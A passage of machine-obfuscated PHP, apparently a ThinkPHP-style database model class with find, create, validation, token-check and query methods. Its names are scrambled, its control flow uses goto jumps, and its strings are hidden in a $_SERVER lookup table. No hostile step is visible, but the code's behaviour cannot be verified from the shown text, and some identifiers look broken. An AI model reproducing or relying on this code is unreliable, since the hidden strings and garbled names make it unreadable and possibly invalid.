$fÖè‚£ÌÂ[70] != substr($C´ìàÕÙ“á, 0, 1) && !1 === strpos($C´ìàÕÙ“á, $fÖè‚£ÌÂ[91]) && !1 === strpos($C´ìàÕÙ“á, $fÖè‚£ÌÂ[252]) && !1 === strpos($C´ìàÕÙ“á, $fÖè‚£ÌÂ[275]) && !1 === strpos($C´ìàÕÙ“á, $fÖè‚£ÌÂ[276])) { unset($b¼†Õñß¤ß[$fÖè‚£ÌÂ[267]][$C´ìàÕÙ“á]); } } } $this->_options_filter($b¼†Õñß¤ß); return $b¼†Õñß¤ß; goto fÔ³¬Ê¸‰¿; dõáâ‘ìÍ»: $fÖè‚£ÌÂ =& $_SERVER[…Ò×–]; if (is_array($b¼†Õñß¤ß)) { $b¼†Õñß¤ß = array_merge($this->options, $b¼†Õñß¤ß); } $this->options = array(); goto bÏöÎ°ì; fÔ³¬Ê¸‰¿: } protected function _options_filter(&$c„Ô’†ÚÔ) { } protected function _parseType(&$D÷°ë‹µóÃ, $dêÚ‘ù©Õ£) { $dåìÇ·æ®Ø =& $_SERVER[…Ò×–]; if (empty($this->options[$dåìÇ·æ®Ø[277]][$dåìÇ·æ®Ø[4] . $dêÚ‘ù©Õ£])) { $B–‰‘ùáİŞ = strtolower($this->fields[$dåìÇ·æ®Ø[244]][$dêÚ‘ù©Õ£]); if (!1 !== strpos($B–‰‘ùáİŞ, $dåìÇ·æ®Ø[278])) { } elseif (!1 === strpos($B–‰‘ùáİŞ, $dåìÇ·æ®Ø[279]) && !1 !== strpos($B–‰‘ùáİŞ, $dåìÇ·æ®Ø[280])) { $D÷°ë‹µóÃ[$dêÚ‘ù©Õ£] = intval($D÷°ë‹µóÃ[$dêÚ‘ù©Õ£]); } elseif (!1 !== strpos($B–‰‘ùáİŞ, $dåìÇ·æ®Ø[281]) || !1 !== strpos($B–‰‘ùáİŞ, $dåìÇ·æ®Ø[282])) { $D÷°ë‹µóÃ[$dêÚ‘ù©Õ£] = floatval($D÷°ë‹µóÃ[$dêÚ‘ù©Õ£]); } elseif (!1 !== strpos($B–‰‘ùáİŞ, $dåìÇ·æ®Ø[283])) { $D÷°ë‹µóÃ[$dêÚ‘ù©Õ£] = (bool) $D÷°ë‹µóÃ[$dêÚ‘ù©Õ£]; } } } public function find($bœœë£Õ‹‰ = array()) { goto cäØ’ÌÓÃµ; eÙí‰®¼Ñ«: $bœœë£Õ‹‰ = $this->_parseOptions(); $A‹ÔŸçô = $this->db->select($bœœë£Õ‹‰); if (!1 === $A‹ÔŸçô) { return !1; } goto fˆ‰ÅÔ‰òë; fˆ‰ÅÔ‰òë: if (empty($A‹ÔŸçô)) { return null; } $this->data = $A‹ÔŸçô[0]; $this->_afterFind($this->data, $bœœë£Õ‹‰); goto Dóë®öÖÙí; Dóë®öÖÙí: if (!empty($this->options[$cåö«Ô¿²Î[285]])) { return $this->returnResult($this->data, $this->options[$cåö«Ô¿²Î[285]]); } return $this->data; goto AœÕ‰Åöá‹; cäØ’ÌÓÃµ: $cåö«Ô¿²Î =& $_SERVER[…Ò×–]; if (is_numeric($bœœë£Õ‹‰) || is_string($bœœë£Õ‹‰)) { $Fó‘£³È—Õ[$this->getPk()] = intval($bœœë£Õ‹‰); $this->options[$cåö«Ô¿²Î[267]] = $Fó‘£³È—Õ; } $this->options[$cåö«Ô¿²Î[284]] = 1; goto eÙí‰®¼Ñ«; AœÕ‰Åöá‹: } protected function _afterFind(&$CßØë–ÎŸÕ, $dõªø‡…˜‚) { } protected function returnResult($D‡êòô­Áò, $fÀÌÍ„Â˜‘ = '') { $F¶Í˜ğ¤­ =& $_SERVER[…Ò×–]; if ($fÀÌÍ„Â˜‘) { if (is_callable($fÀÌÍ„Â˜‘)) { return call_user_func($fÀÌÍ„Â˜‘, $D‡êòô­Áò); } switch (strtolower($fÀÌÍ„Â˜‘)) { case $F¶Í˜ğ¤­[286]: return json_encode($D‡êòô­Áò); case $F¶Í˜ğ¤­[287]: return xml_encode($D‡êòô­Áò); } } return $D‡êòô­Áò; } public function parseFieldsMap($A‘È¾·¹çÑ, $dÆ¤÷åóŸ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $f·ÔŒªÂ¤ => $AÈëø–ÆÑç) { if ($dÆ¤÷åóŸ == 1) { if (isset($A‘È¾·¹çÑ[$AÈëø–ÆÑç])) { $A‘È¾·¹çÑ[$f·ÔŒªÂ¤] = $A‘È¾·¹çÑ[$AÈëø–ÆÑç]; unset($A‘È¾·¹çÑ[$AÈëø–ÆÑç]); } } else { if (isset($A‘È¾·¹çÑ[$f·ÔŒªÂ¤])) { $A‘È¾·¹çÑ[$AÈëø–ÆÑç] = $A‘È¾·¹çÑ[$f·ÔŒªÂ¤]; unset($A‘È¾·¹çÑ[$f·ÔŒªÂ¤]); } } } } return $A‘È¾·¹çÑ; } public function setField($c²ŞÅ‹×´, $B¤îĞÁ²ï– = '') { if (is_array($c²ŞÅ‹×´)) { $b¯Éïòóİİ = $c²ŞÅ‹×´; } else { $b¯Éïòóİİ[$c²ŞÅ‹×´] = $B¤îĞÁ²ï–; } return $this->save($b¯Éïòóİİ); } public function setAdd($d•Ê–ˆ†®Æ, $dïÄä±ôõ = 1) { $c·Ö£ù—èÃ =& $_SERVER[…Ò×–]; $CĞÃº¡ñÅ¸ = $d•Ê–ˆ†®Æ . $c·Ö£ù—èÃ[288] . $dïÄä±ôõ; if ($dïÄä±ôõ < 0) { $CĞÃº¡ñÅ¸ = $d•Ê–ˆ†®Æ . $dïÄä±ôõ; } return $this->setField($d•Ê–ˆ†®Æ, array($c·Ö£ù—èÃ[289], $CĞÃº¡ñÅ¸)); } public function getField($eÖğ¯ø°Æ‚, $fÑˆè»ù = null) { $a¿´±‚Ê…´ =& $_SERVER[…Ò×–]; $aÇ¬äÇâ«[$a¿´±‚Ê…´[265]] = $eÖğ¯ø°Æ‚; $aÇ¬äÇâ« = $this->_parseOptions($aÇ¬äÇâ«); $eÖğ¯ø°Æ‚ = trim($eÖğ¯ø°Æ‚); if (strpos($eÖğ¯ø°Æ‚, $a¿´±‚Ê…´[47])) { if (!isset($aÇ¬äÇâ«[$a¿´±‚Ê…´[284]])) { $aÇ¬äÇâ«[$a¿´±‚Ê…´[284]] = is_numeric($fÑˆè»ù) ? $fÑˆè»ù : $a¿´±‚Ê…´[33]; } $cÅ—ƒĞ‡‡º = $this->db->select($aÇ¬äÇâ«); if (!empty($cÅ—ƒĞ‡‡º)) { goto Bºóç´¹õµ; bÎè…‚— °: $EÔõ­ÔÀñ­ = array_shift($eÖğ¯ø°Æ‚); $EÒÏš—µÃ = array(); $BÛ‚¦Ñ¹š» = count($Aï‘ˆ½±Î); goto a¼­¾›İ‡—; a¼­¾›İ‡—: foreach ($cÅ—ƒĞ‡‡º as $eéŸ¡¥ç‡¾) { $CÃô¢Â¯‡é = $eéŸ¡¥ç‡¾[$e•”—ÛªŠµ]; if (2 == $BÛ‚¦Ñ¹š») { $EÒÏš—µÃ[$CÃô¢Â¯‡é] = $eéŸ¡¥ç‡¾[$EÔõ­ÔÀñ­]; } else { $EÒÏš—µÃ[$CÃô¢Â¯‡é] = is_string($fÑˆè»ù) ? implode($fÑˆè»ù, $eéŸ¡¥ç‡¾) : $eéŸ¡¥ç‡¾; } } return $EÒÏš—µÃ; goto Aß¶‹³Ü¢¤; Bºóç´¹õµ: $Aï‘ˆ½±Î = explode($a¿´±‚Ê…´[47], $eÖğ¯ø°Æ‚); $eÖğ¯ø°Æ‚ = array_keys($cÅ—ƒĞ‡‡º[0]); $e•”—ÛªŠµ = array_shift($eÖğ¯ø°Æ‚); goto bÎè…‚— °; Aß¶‹³Ü¢¤: } } else { if (!0 !== $fÑˆè»ù) { $aÇ¬äÇâ«[$a¿´±‚Ê…´[284]] = is_numeric($fÑˆè»ù) ? $fÑˆè»ù : 1; } if ($fÑˆè»ù === $a¿´±‚Ê…´[247]) { unset($aÇ¬äÇâ«[$a¿´±‚Ê…´[284]]); } $eéŸ¡¥ç‡¾ = $this->db->select($aÇ¬äÇâ«); if (!empty($eéŸ¡¥ç‡¾)) { if ($fÑˆè»ù === $a¿´±‚Ê…´[247]) { return reset($eéŸ¡¥ç‡¾[0]); } if (!0 !== $fÑˆè»ù && 1 == $aÇ¬äÇâ«[$a¿´±‚Ê…´[284]]) { return reset($eéŸ¡¥ç‡¾[0]); } foreach ($eéŸ¡¥ç‡¾ as $C¢™ÏØ¹å) { $E’£æ¢ù—Ä[] = $C¢™ÏØ¹å[$eÖğ¯ø°Æ‚]; } return $E’£æ¢ù—Ä; } } return null; } public function create($báìÑ„éĞ = '', $AŠ’Á¥Ü‘® = '') { goto FæÁŒÎ“ ‚; FæÁŒÎ“ ‚: $FÖäãÅÇ‰­ =& $_SERVER[…Ò×–]; if (empty($báìÑ„éĞ)) { $báìÑ„éĞ = $_POST; } elseif (is_object($báìÑ„éĞ)) { $báìÑ„éĞ = get_object_vars($báìÑ„éĞ); } if (empty($báìÑ„éĞ) || !is_array($báìÑ„éĞ)) { $this->error = think_lang($FÖäãÅÇ‰­[263]); return !1; } goto e‡††Èåç; aíŸ‰ï›³: return $báìÑ„éĞ; goto D¦ª‚™ÅĞ¾; CŞÁƒõÅ: if ($this->autoCheckFields) { $FîÊ’¥¾Ş¬ = $this->getDbFields(); foreach ($báìÑ„éĞ as $FÆò¸ç£ÀÛ => $DÛò®³») { if (!in_array($FÆò¸ç£ÀÛ, $FîÊ’¥¾Ş¬)) { unset($báìÑ„éĞ[$FÆò¸ç£ÀÛ]); } elseif (MAGIC_QUOTES_GPC && is_string($DÛò®³»)) { $báìÑ„éĞ[$FÆò¸ç£ÀÛ] = stripslashes($DÛò®³»); } } } $this->autoOperation($báìÑ„éĞ, $AŠ’Á¥Ü‘®); $this->data = $báìÑ„éĞ; goto aíŸ‰ï›³; B¢§¾¬‚ğ³: if (isset($FîÊ’¥¾Ş¬)) { if (is_string($FîÊ’¥¾Ş¬)) { $FîÊ’¥¾Ş¬ = explode($FÖäãÅÇ‰­[47], $FîÊ’¥¾Ş¬); } if (think_config($FÖäãÅÇ‰­[290])) { $FîÊ’¥¾Ş¬[] = think_config($FÖäãÅÇ‰­[291]); } foreach ($báìÑ„éĞ as $FÆò¸ç£ÀÛ => $DÛò®³») { if (!in_array($FÆò¸ç£ÀÛ, $FîÊ’¥¾Ş¬)) { unset($báìÑ„éĞ[$FÆò¸ç£ÀÛ]); } } } if (!$this->autoValidation($báìÑ„éĞ, $AŠ’Á¥Ü‘®)) { return !1; } if (!$this->autoCheckToken($báìÑ„éĞ)) { $this->error = think_lang($FÖäãÅÇ‰­[292]); return !1; } goto CŞÁƒõÅ; e‡††Èåç: $báìÑ„éĞ = $this->parseFieldsMap($báìÑ„éĞ, 0); $AŠ’Á¥Ü‘® = $AŠ’Á¥Ü‘® ? $AŠ’Á¥Ü‘® : (!empty($báìÑ„éĞ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$FÖäãÅÇ‰­[265]])) { $FîÊ’¥¾Ş¬ = $this->options[$FÖäãÅÇ‰­[265]]; unset($this->options[$FÖäãÅÇ‰­[265]]); } elseif ($AŠ’Á¥Ü‘® == THINK_MODEL_INSERT && isset($this->insertFields)) { $FîÊ’¥¾Ş¬ = $this->insertFields; } elseif ($AŠ’Á¥Ü‘® == THINK_MODEL_UPDATE && isset($this->updateFields)) { $FîÊ’¥¾Ş¬ = $this->updateFields; } goto B¢§¾¬‚ğ³; D¦ª‚™ÅĞ¾: } public function autoCheckToken($EœÁæ¤†á) { $c©µí¬£É‡ =& $_SERVER[…Ò×–]; if (isset($this->options[$c©µí¬£É‡[293]]) && !$this->options[$c©µí¬£É‡[293]]) { return !0; } if (think_config($c©µí¬£É‡[290])) { $AÒ™óßçˆå = think_config($c©µí¬£É‡[291]); if (!isset($EœÁæ¤†á[$AÒ™óßçˆå]) || Session::get($AÒ™óßçˆå)) { return !1; } list($E‘£Ü‘Ã®, $F™„Äˆ·ö) = explode($c©µí¬£É‡[70], $EœÁæ¤†á[$AÒ™óßçˆå]); if ($F™„Äˆ·ö && Session::get($AÒ™óßçˆå . $c©µí¬£É‡[91] . $E‘£Ü‘Ã®) === $F™„Äˆ·ö) { Session::remove($AÒ™óßçˆå . $c©µí¬£É‡[91] . $E‘£Ü‘Ã®); return !0; } if (think_config($c©µí¬£É‡[294])) { Session::remove($AÒ™óßçˆå . $c©µí¬£É‡[91] . $E‘£Ü‘Ã®); } return !1; } return !0; } public function regex($E‘ƒŞ¦”·, $E‡ÀÓùğ·) { $Fğ¬Ÿ±Ù‚× =& $_SERVER[…Ò×–]; $aÒŞÚôáà = array($Fğ¬Ÿ±Ù‚×[295] => $Fğ¬Ÿ±Ù‚×[296], $Fğ¬Ÿ±Ù‚×[297] => $Fğ¬Ÿ±Ù‚×[298], $Fğ¬Ÿ±Ù‚×[299] => $Fğ¬Ÿ±Ù‚×[300], $Fğ¬Ÿ±Ù‚×[301] => $Fğ¬Ÿ±Ù‚×[302], $Fğ¬Ÿ±Ù‚×[303] => $Fğ¬Ÿ±Ù‚×[304], $Fğ¬Ÿ±Ù‚×[305] => $Fğ¬Ÿ±Ù‚×[306], $Fğ¬Ÿ±Ù‚×[307] => $Fğ¬Ÿ±Ù‚×[308], $Fğ¬Ÿ±Ù‚×[282] => $Fğ¬Ÿ±Ù‚×[309], $Fğ¬Ÿ±Ù‚×[310] => $Fğ¬Ÿ±Ù‚×[311]); if (isset($aÒŞÚôáà[strtolower($E‡ÀÓùğ·)])) { $E‡ÀÓùğ· = $aÒŞÚôáà[strtolower($E‡ÀÓùğ·)]; } return preg_match($E‡ÀÓùğ·, $E‘ƒŞ¦”·) === 1; } private function autoOperation(&$D¢¾æ˜±½ğ, $D–Êã÷®óÍ) { $cíâ›±ÇÔ =& $_SERVER[…Ò×–]; if (!empty($this->options[$cíâ›±ÇÔ[312]])) { $F’ âª£ø = $this->options[$cíâ›±ÇÔ[312]]; unset($this->options[$cíâ›±ÇÔ[312]]); } elseif (!empty($this->_auto)) { $F’ âª£ø = $this->_auto; } if (isset($F’ âª£ø)) { foreach ($F’ âª£ø as $bÛšïÉí«) { if (empty($bÛšïÉí«[2])) { $bÛšïÉí«[2] = THINK_MODEL_INSERT; } if ($D–Êã÷®óÍ == $bÛšïÉí«[2] || $bÛšïÉí«[2] == THINK_MODEL_BOTH) { switch (trim($bÛšïÉí«[3])) { case $cíâ›±ÇÔ[313]: case $cíâ›±ÇÔ[314]: $CÚØÙ—Ÿôö = isset($bÛšïÉí«[4]) ? (array) $bÛšïÉí«[4] : array(); if (isset($D¢¾æ˜±½ğ[$bÛšïÉí«[0]])) { array_unshift($CÚØÙ—Ÿôö, $D¢¾æ˜±½ğ[$bÛšïÉí«[0]]); } if ($cíâ›±ÇÔ[313] == $bÛšïÉí«[3]) { $D¢¾æ˜±½ğ[$bÛšïÉí«[0]] = call_user_func_array($bÛšïÉí«[1], $CÚØÙ—Ÿôö); } else { $D¢¾æ˜±½ğ[$bÛšïÉí«[0]] = call_user_func_array(array(&$this, $bÛšïÉí«[1]), $CÚØÙ—Ÿôö); } break; case $cíâ›±ÇÔ[265]: $D¢¾æ˜±½ğ[$bÛšïÉí«[0]] = $D¢¾æ˜±½ğ[$bÛšïÉí«[1]]; break; case $cíâ›±ÇÔ[315]: if ($cíâ›±ÇÔ[33] === $D¢¾æ˜±½ğ[$bÛšïÉí«[0]]) { unset($D¢¾æ˜±½ğ[$bÛšïÉí«[0]]); } break; case $cíâ›±ÇÔ[316]: default: $D¢¾æ˜±½ğ[$bÛšïÉí«[0]] = $bÛšïÉí«[1]; } if (!1 === $D¢¾æ˜±½ğ[$bÛšïÉí«[0]]) { unset($D¢¾æ˜±½ğ[$bÛšïÉí«[0]]); } } } } return $D¢¾æ˜±½ğ; } protected function autoValidation($EÃ†¼…ğµ, $aĞí¨´•¼¸) { $D®İ¡µËŒ¸ =& $_SERVER[…Ò×–]; if (!empty($this->options[$D®İ¡µËŒ¸[317]])) { $B‚š©Œíìå = $this->options[$D®İ¡µËŒ¸[317]]; unset($this->options[$D®İ¡µËŒ¸[317]]); } elseif (!empty($this->_validate)) { $B‚š©Œíìå = $this->_validate; } if (isset($B‚š©Œíìå)) { if ($this->patchValidate) { $this->error = array(); } foreach ($B‚š©Œíìå as $eÉ‚àÎãÅ => $cà«ô…Ñ©È) { if (empty($cà«ô…Ñ©È[5]) || $cà«ô…Ñ©È[5] == THINK_MODEL_BOTH || $cà«ô…Ñ©È[5] == $aĞí¨´•¼¸) { if (0 == strpos($cà«ô…Ñ©È[2], $D®İ¡µËŒ¸[318]) && strpos($cà«ô…Ñ©È[2], $D®İ¡µËŒ¸[319])) { $cà«ô…Ñ©È[2] = think_lang(substr($cà«ô…Ñ©È[2], 2, -1)); } $cà«ô…Ñ©È[3] = isset($cà«ô…Ñ©È[3]) ? $cà«ô…Ñ©È[3] : THINK_EXISTS_VALIDATE; $cà«ô…Ñ©È[4] = isset($cà«ô…Ñ©È[4]) ? $cà«ô…Ñ©È[4] : $D®İ¡µËŒ¸[320]; switch ($cà«ô…Ñ©È[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($EÃ†¼…ğµ, $cà«ô…Ñ©È)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($D®İ¡µËŒ¸[33] != trim($EÃ†¼…ğµ[$cà«ô…Ñ©È[0]])) { if (!1 === $this->_validationField($EÃ†¼…ğµ, $cà«ô…Ñ©È)) { return !1; } } break; default: if (isset($EÃ†¼…ğµ[$cà«ô…Ñ©È[0]])) { if (!1 === $this->_validationField($EÃ†¼…ğµ, $cà«ô…Ñ©È)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($E­ï‘óİÕ, $cïäÒÑŠœ‘) { if (!1 === $this->_validationFieldItem($E­ï‘óİÕ, $cïäÒÑŠœ‘)) { if ($this->patchValidate) { $this->error[$cïäÒÑŠœ‘[0]] = $cïäÒÑŠœ‘[2]; } else { $this->error = $cïäÒÑŠœ‘[2]; return !1; } } return; } protected function _validationFieldItem($CÅ“®µ¨Ö, $BÙˆéÎ½Ö×) { $aåòšêÑ•¨ =& $_SERVER[…Ò×–]; switch (strtolower(trim($BÙˆéÎ½Ö×[4]))) { case $aåòšêÑ•¨[313]: case $aåòšêÑ•¨[314]: $e†ÉÒ´ÈàÉ = isset($BÙˆéÎ½Ö×[6]) ? (array) $BÙˆéÎ½Ö×[6] : array(); if (is_string($BÙˆéÎ½Ö×[0]) && strpos($BÙˆéÎ½Ö×[0], $aåòšêÑ•¨[47])) { $BÙˆéÎ½Ö×[0] = explode($aåòšêÑ•¨[47], $BÙˆéÎ½Ö×[0]); } if (is_array($BÙˆéÎ½Ö×[0])) { foreach ($BÙˆéÎ½Ö×[0] as $e»‘º‚‡ª¥) { $Eè˜èÃÆÌä[$e»‘º‚‡ª¥] = $CÅ“®µ¨Ö[$e»‘º‚‡ª¥]; } array_unshift($e†ÉÒ´ÈàÉ, $Eè˜èÃÆÌä); } else { array_unshift($e†ÉÒ´ÈàÉ, $CÅ“®µ¨Ö[$BÙˆéÎ½Ö×[0]]); } if ($aåòšêÑ•¨[313] == $BÙˆéÎ½Ö×[4]) { return call_user_func_array($BÙˆéÎ½Ö×[1], $e†ÉÒ´ÈàÉ); } else { return call_user_func_array(array(&$this, $BÙˆéÎ½Ö×[1]), $e†ÉÒ´ÈàÉ); } case $aåòšêÑ•¨[321]: return $CÅ“®µ¨Ö[$BÙˆéÎ½Ö×[0]] == $CÅ“®µ¨Ö[$BÙˆéÎ½Ö×[1]]; case $aåòšêÑ•¨[322]: if (is_string($BÙˆéÎ½Ö×[0]) && strpos($BÙˆéÎ½Ö×[0], $aåòšêÑ•¨[47])) { $BÙˆéÎ½Ö×[0] = explode($aåòšêÑ•¨[47], $BÙˆéÎ½Ö×[0]); } $e¼ƒÍó–Š = array(); if (is_array($BÙˆéÎ½Ö×[0])) { foreach ($BÙˆéÎ½Ö×[0] as $e»‘º‚‡ª¥) { $e¼ƒÍó–Š[$e»‘º‚‡ª¥] = $CÅ“®µ¨Ö[$e»‘º‚‡ª¥]; } } else { $e¼ƒÍó–Š[$BÙˆéÎ½Ö×[0]] = $CÅ“®µ¨Ö[$BÙˆéÎ½Ö×[0]]; } if (!empty($CÅ“®µ¨Ö[$this->getPk()])) { $e¼ƒÍó–Š[$this->getPk()] = array($aåòšêÑ•¨[323], $CÅ“®µ¨Ö[$this->getPk()]); } if ($this->where($e¼ƒÍó–Š)->find()) { return !1; } return !0; default: return $this->check($CÅ“®µ¨Ö[$BÙˆéÎ½Ö×[0]], $BÙˆéÎ½Ö×[1], $BÙˆéÎ½Ö×[4]); } } public function check($D¸ÀìĞ³Õ, $dÙˆÕ»ç“¶, $eÄ¹®ÂÏ‰» = "\162\x65\147\145\x78") { $b­ØŒ¸¸ÊÑ =& $_SERVER[…Ò×–]; $eÄ¹®ÂÏ‰» = strtolower(trim($eÄ¹®ÂÏ‰»)); switch ($eÄ¹®ÂÏ‰») { case $b­ØŒ¸¸ÊÑ[7]: case $b­ØŒ¸¸ÊÑ[324]: $EøÖ¦æ«³ë = is_array($dÙˆÕ»ç“¶) ? $dÙˆÕ»ç“¶ : explode($b­ØŒ¸¸ÊÑ[47], $dÙˆÕ»ç“¶); return $eÄ¹®ÂÏ‰» == $b­ØŒ¸¸ÊÑ[7] ? in_array($D¸ÀìĞ³Õ, $EøÖ¦æ«³ë) : !in_array($D¸ÀìĞ³Õ, $EøÖ¦æ«³ë); case $b­ØŒ¸¸ÊÑ[325]: case $b­ØŒ¸¸ÊÑ[326]: if (is_array($dÙˆÕ»ç“¶)) { $B³ºåç µ = $dÙˆÕ»ç“¶[0]; $EµÑ‰¾¨ƒˆ = $dÙˆÕ»ç“¶[1]; } else { list($B³ºåç µ, $EµÑ‰¾¨ƒˆ) = explode($b­ØŒ¸¸ÊÑ[47], $dÙˆÕ»ç“¶); } return $eÄ¹®ÂÏ‰» == $b­ØŒ¸¸ÊÑ[325] ? $D¸ÀìĞ³Õ >= $B³ºåç µ && $D¸ÀìĞ³Õ <= $EµÑ‰¾¨ƒˆ : $D¸ÀìĞ³Õ < $B³ºåç µ || $D¸ÀìĞ³Õ > $EµÑ‰¾¨ƒˆ; case $b­ØŒ¸¸ÊÑ[327]: case $b­ØŒ¸¸ÊÑ[328]: return $eÄ¹®ÂÏ‰» == $b­ØŒ¸¸ÊÑ[327] ? $D¸ÀìĞ³Õ == $dÙˆÕ»ç“¶ : $D¸ÀìĞ³Õ != $dÙˆÕ»ç“¶; case $b­ØŒ¸¸ÊÑ[329]: $b‘ÎÔë‹š“ = mb_strlen($D¸ÀìĞ³Õ, $b­ØŒ¸¸ÊÑ[330]); if (strpos($dÙˆÕ»ç“¶, $b­ØŒ¸¸ÊÑ[47])) { list($B³ºåç µ, $EµÑ‰¾¨ƒˆ) = explode($b­ØŒ¸¸ÊÑ[47], $dÙˆÕ»ç“¶); return $b‘ÎÔë‹š“ >= $B³ºåç µ && $b‘ÎÔë‹š“ <= $EµÑ‰¾¨ƒˆ; } else { return $b‘ÎÔë‹š“ == $dÙˆÕ»ç“¶; } case $b­ØŒ¸¸ÊÑ[331]: list($e®¨éÍãùÈ, $e†ÒëŸ¨Ù‘) = explode($b­ØŒ¸¸ÊÑ[47], $dÙˆÕ»ç“¶); if (!is_numeric($e®¨éÍãùÈ)) { $e®¨éÍãùÈ = strtotime($e®¨éÍãùÈ); } if (!is_numeric($e†ÒëŸ¨Ù‘)) { $e†ÒëŸ¨Ù‘ = strtotime($e†ÒëŸ¨Ù‘); } return NOW_TIME >= $e®¨éÍãùÈ && NOW_TIME <= $e†ÒëŸ¨Ù‘; case $b­ØŒ¸¸ÊÑ[332]: return in_array(get_client_ip(), explode($b­ØŒ¸¸ÊÑ[47], $dÙˆÕ»ç“¶)); case $b­ØŒ¸¸ÊÑ[333]: return !in_array(get_client_ip(), explode($b­ØŒ¸¸ÊÑ[47], $dÙˆÕ»ç“¶)); case $b­ØŒ¸¸ÊÑ[320]: default: return $this->regex($D¸ÀìĞ³Õ, $dÙˆÕ»ç“¶); } } public function query($dÚÌÒ¥Öø, $fÒÚµäÊö© = false) { $FêÁ“·—äË =& $_SERVER[…Ò×–]; if (!is_bool($fÒÚµäÊö©) && !is_array($fÒÚµäÊö©)) { $fÒÚµäÊö© = func_get_args(); array_shift($fÒÚµäÊö©); } $dÚÌÒ¥Öø = str_replace(array($FêÁ“·—äË[221], $FêÁ“·—äË[334]), $FêÁ“·—äË[50], $dÚÌÒ¥Öø); $dÚÌÒ¥Öø = $this->parseSql($dÚÌÒ¥Öø, $fÒÚµäÊö©); return $this->db->query($dÚÌÒ¥Öø); } public function execute($A„âÎíèíø, $aÍİÃøµ…é = false) { if (!is_bool($aÍİÃøµ…é) && !is_array($aÍİÃøµ…é)) { $aÍİÃøµ…é = func_get_args(); array_shift($aÍİÃøµ…é); } $A„âÎíèíø = $this->parseSql($A„âÎíèíø, $aÍİÃøµ…é); return $this->db->execute($A„âÎíèíø); } protected function parseSql($AËŞƒïƒ‚¡, $a’ŞñßÚé) { $cš¶Æù´©ì =& $_SERVER[…Ò×–]; if (!0 === $a’ŞñßÚé) { $Cë§Œ§Œí = $this->_parseOptions(); $AËŞƒïƒ‚¡ = $this->db->parseSql($AËŞƒïƒ‚¡, $Cë§Œ§Œí); } elseif (is_array($a’ŞñßÚé)) { $a’ŞñßÚé = array_map(array($this->db, $cš¶Æù´©ì[335]), $a’ŞñßÚé); $AËŞƒïƒ‚¡ = vsprintf($AËŞƒïƒ‚¡, $a’ŞñßÚé); } else { $AËŞƒïƒ‚¡ = strtr($AËŞƒïƒ‚¡, array($cš¶Æù´©ì[336] => $this->getTableName(), $cš¶Æù´©ì[337] => think_config($cš¶Æù´©ì[236]))); } $this->db->setModel($this->name); return $AËŞƒïƒ‚¡; } public function db($AÌ¾±º½Ê = '', $eºïÔÎà’­ = '', $b¡‚°Öâ” = array()) { goto Fù“×‘ÜÑ; fóíÓã†À: static $D¡ô§¿„øÑ = array(); if (!isset($D¡ô§¿„øÑ[$AÌ¾±º½Ê]) || isset($D¡ô§¿„øÑ[$AÌ¾±º½Ê]) && $eºïÔÎà’­ && $d‡Šó˜ì¦[$AÌ¾±º½Ê] != $eºïÔÎà’­) { if (!empty($eºïÔÎà’­) && is_string($eºïÔÎà’­) && !1 === strpos($eºïÔÎà’­, $BíŞçÖÇ³[8])) { $eºïÔÎà’­ = think_config($eºïÔÎà’­); } $D¡ô§¿„øÑ[$AÌ¾±º½Ê] = Db::getInstance($eºïÔÎà’­); } elseif (NULL === $eºïÔÎà’­) { $D¡ô§¿„øÑ[$AÌ¾±º½Ê]->close(); unset($D¡ô§¿„øÑ[$AÌ¾±º½Ê]); return; } if (!empty($b¡‚°Öâ”)) { if (is_string($b¡‚°Öâ”)) { parse_str($b¡‚°Öâ”, $b¡‚°Öâ”); } foreach ($b¡‚°Öâ” as $bší÷‚‡•Ç => $A­®–ÉŒ÷) { $this->setProperty($bší÷‚‡•Ç, $A­®–ÉŒ÷); } } goto e¸ÓªñğÈ; AÂ˜’ğÆåÃ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto eºŒ¸ëâÅ´; Fù“×‘ÜÑ: $BíŞçÖÇ³ =& $_SERVER[…Ò×–]; if ($BíŞçÖÇ³[33] === $AÌ¾±º½Ê && $this->db) { return $this->db; } static $d‡Šó˜ì¦ = array(); goto fóíÓã†À; e¸ÓªñğÈ: $d‡Šó˜ì¦[$AÌ¾±º½Ê] = $eºïÔÎà’­; $this->db = $D¡ô§¿„øÑ[$AÌ¾±º½Ê]; $this->_after_db(); goto AÂ˜’ğÆåÃ; eºŒ¸ëâÅ´: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $aêä­Õö–– = get_class($this); if ($aêä­Õö–– == $_SERVER[…Ò×–][338]) { return $this->name; } $this->name = substr($aêä­Õö––, 0, -5); } return $this->name; } public function getTableName() { $Dø—ÇÈÅ£¤ =& $_SERVER[…Ò×–]; if (empty($this->trueTableName)) { $DÅïÀƒ÷é» = !empty($this->tablePrefix) ? $this->tablePrefix : $Dø—ÇÈÅ£¤[33]; if (!empty($this->tableName)) { $DÅïÀƒ÷é» .= $this->tableName; } else { $DÅïÀƒ÷é» .= think_parse_name($this->name); } $this->trueTableName = strtolower($DÅïÀƒ÷é»); } return (!empty($this->dbName) ? $this->dbName . $Dø—ÇÈÅ£¤[91] : $Dø—ÇÈÅ£¤[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $fâ›„†¯Œ­ =& $_SERVER[…Ò×–]; return isset($this->fields[$fâ›„†¯Œ­[243]]) ? $this->fields[$fâ›„†¯Œ­[243]] : $this->pk; } public function getDbFields() { $bíŒÆ¨¨ =& $_SERVER[…Ò×–]; if (isset($this->options[$bíŒÆ¨¨[271]])) { $FÔÏÆˆ„ = $this->db->getFields($this->options[$bíŒÆ¨¨[271]]); return $FÔÏÆˆ„ ? array_keys($FÔÏÆˆ„) : !1; } if ($this->fields) { $FÔÏÆˆ„ = $this->fields; unset($FÔÏÆˆ„[$bíŒÆ¨¨[242]], $FÔÏÆˆ„[$bíŒÆ¨¨[243]], $FÔÏÆˆ„[$bíŒÆ¨¨[244]], $FÔÏÆˆ„[$bíŒÆ¨¨[241]]); return 